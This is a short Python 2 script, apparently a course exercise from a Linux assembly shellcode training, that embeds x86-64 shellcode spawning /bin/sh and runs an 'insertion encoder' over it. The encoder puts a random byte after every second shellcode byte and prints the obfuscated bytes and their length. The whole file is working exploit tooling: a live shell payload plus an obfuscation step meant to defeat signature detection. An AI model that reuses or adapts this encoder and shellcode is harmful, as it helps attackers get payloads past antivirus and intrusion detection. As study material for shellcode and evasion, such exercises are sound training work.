# Python Insertion Encoder
# Author Javier Tejedor
# Script based in Vivek Ramachandran's script
# http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
import random
 
# simple shellcode that launch a shell
shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05");
 
encoded = ""
plainText = ""
control = 1
 
print 'Encoded shellcode ...'
 
for x in bytearray(shellcode) :
 
	encoded += '0x'
	encoded += '%02x,' %x
	if control == 1:
		encoded += '0x%02x,' % random.randint(1,255)
 
	control = control + 1
	if control == 3:
		control = 1
 
 
print encoded
 
print 'Len: %d' % len(bytearray(shellcode))
